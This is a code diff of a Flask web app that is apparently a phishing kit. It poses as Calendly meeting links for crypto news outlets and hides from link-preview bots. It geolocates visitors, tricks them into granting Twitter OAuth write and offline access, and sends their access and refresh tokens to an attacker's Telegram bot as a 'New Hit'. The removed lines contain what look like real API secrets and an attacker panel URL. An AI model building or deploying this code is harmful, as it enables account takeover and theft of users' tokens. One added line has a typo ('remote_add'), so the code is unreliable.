@@ -4,54 +4,43 @@ import base64
 
 app = Flask(__name__)
 
-TWITTER_CLIENT_ID = 'eWNUdkx4LTlnaGQ0N3BaSGJyYkU6MTpjaQ'
-TWITTER_CLIENT_SECRET = 'FJchk67NNjQgydI77UUI1xQ7a8u4zY50LJuPYFCzzP8I0MkSZ6'
-TWITTER_CALLBACK_URL = 'https://twitter-logger.onrender.com/callback'
-TELEGRAM_GROUP_CHAT_ID = '-4124636328'
+TWITTER_CLIENT_ID = '' # Replace with your Twitter client ID
+TWITTER_CLIENT_SECRET = '' # Replace with your Twitter client secret
 
-TELEGRAM_BOT_TOKEN = '6790216831:AAHbUIZKq38teKnZIw9zUQDRSD6csT-JEs4'
+TELEGRAM_GROUP_CHAT_ID = '' # Replace with your Telegram group chat ID
+TELEGRAM_BOT_TOKEN = '' # Replace with your Telegram bot token
 
 credentials = f"{TWITTER_CLIENT_ID}:{TWITTER_CLIENT_SECRET}"
 credentials_base64 = base64.b64encode(credentials.encode()).decode('utf-8')
 
-@app.route('/decryptmedia/meeting-hour')
+@app.route('/cointelegraph') # Examples: cointelegraph, decryptmedia, etc
 def index():
-    user_agent = request.headers.get('User-Agent').strip('\r\n')
-    if 'Twitterbot' in user_agent or 'Discordbot' in user_agent or 'TelegramBot' in user_agent:
-        return redirect('https://calendly.com/advonis-x')
+    user_agent = request.headers.get('User-Agent')
+
+    if user_agent is None:
+        user_agent = ''
+
+    user_agent = user_agent.strip('\r\n')
+
+    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
+        return redirect('https://calendly.com/cointele')
     else:
         if 'X-Forwarded-For' in request.headers:
             real_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()
         else:
-            real_ip = request.remote_addr
+            real_ip = request.remote_add
 
-        country = request.headers.get('Cf-Ipcountry')
-        browser_data = request.headers['Sec-Ch-Ua'].split(',')[2].strip()
-        browser = browser_data.replace('"', '').replace(';', '').split('=')[0]
-        browser = browser[:-1]
+        res = requests.get(f'http://ip-api.com/json/{real_ip}')
+        data = res.json()
 
-        url = f"https://restcountries.com/v2/alpha/{country}"
-        response = requests.get(url)
-        response = response.json()
-        country_name = response.get('name', '')
+        country = data["country"]
+        country_code = data["countryCode"]
+        city = data["city"]
 
-        if country_name == "Russian Federation":
-            country_name = "Russia"
+        code_points = [ord(char) + 127397 for char in country_code]
+        country_flag = ''.join(chr(code_point) for code_point in code_points)
 
-        refId = request.args.get('ref')
-        url = f'https://panel-1rn0.onrender.com/api/connection/send/{refId}'
-    
-        data = {
-            'IP': real_ip,
-            'country': country,
-            'device': 'Windows 10',
-            'browser': browser,
-            'flagImg': f"https://cdn.countryflags.com/thumbs/{country_name.lower().replace(' ', '-')}/flag-square-250.png"
-        }
-        
-        res = requests.post(url, json=data, proxies=None)
-    
-        message = f'🔗 Connection: {real_ip}'
+        message = f'🔗 Connection: {real_ip}\n\n{country_flag} {city}, {country}'
 
         requests.post(
             f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
@@ -61,12 +50,13 @@ def index():
             }
         )
 
+        TWITTER_CALLBACK_URL = 'https://callendly.pythonanywhere.com/auth' # Example: /auth, /callback, /authorize
         twitter_oauth_url = f'https://twitter.com/i/oauth2/authorize?response_type=code&client_id={TWITTER_CLIENT_ID}&redirect_uri={TWITTER_CALLBACK_URL}&scope=tweet.read+users.read+tweet.write+offline.access+tweet.moderate.write&state=state&code_challenge=challenge&code_challenge_method=plain'
         return redirect(twitter_oauth_url)
 
-@app.route('/callback')
+
+@app.route('/auth') # Examples: auth, callback, authorize
 def callback():
-  try:
     authorization_code = request.args.get('code')
 
     token_exchange_url = 'https://api.twitter.com/2/oauth2/token'
@@ -75,7 +65,7 @@ def callback():
     request_data = {
         'grant_type': 'authorization_code',
         'code': authorization_code,
-        'redirect_uri': TWITTER_CALLBACK_URL,
+        'redirect_uri': 'https://callendly.pythonanywhere.com/auth', # Example: https://your-name.pythonanywhere.com/your-redirect
         'code_verifier': "challenge"
     }
 
@@ -88,6 +78,7 @@ def callback():
                              data=request_data,
                              headers=headers)
     response_data = response.json()
+    print(response_data)
 
     access_token = response_data['access_token']
     refresh_token = response_data['refresh_token']
@@ -103,24 +94,20 @@ def callback():
 
     username = response_data['data']['username']
 
-    send_to_telegram(username, access_token, refresh_token)
+    send_to_telegram(username, access_token, refresh_token, TELEGRAM_GROUP_CHAT_ID)
 
-    return redirect("https://calendly.com/decryptmedia", code=302)
+    return redirect("https://calendly.com/cointele/45min?back=1&month=2024-08", code=302)
 
-  except Exception as e:
-    return e;
-
-def send_to_telegram(username, access_token, refresh_token):
-  try:
-    message = f'⚠️ *New Hit* ⚠️\n\nx.com/{username}\n\n🔑 Access Token:\n`{access_token}`\n\n🔄 Refresh Token:\n`{refresh_token}`'
+def send_to_telegram(username: str, access_token: str, refresh_token: str, group_id) -> None:
+    message: str = f'⚠️ *New Hit* ⚠️\n\nx.com/{username}\n\n🔑 Access Token:\n`{access_token}`\n\n🔄 Refresh Token:\n`{refresh_token}`'
 
     requests.post(
         f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
         data={
-            'chat_id': TELEGRAM_GROUP_CHAT_ID,
+            'chat_id': group_id,
             'text': message,
             'parse_mode': 'MarkDown'
         })
 
-  except Exception as e:
-    print(f'Error sending message to Telegram: {str(e)}')
+if __name__ == '__main__':
+  app.run()
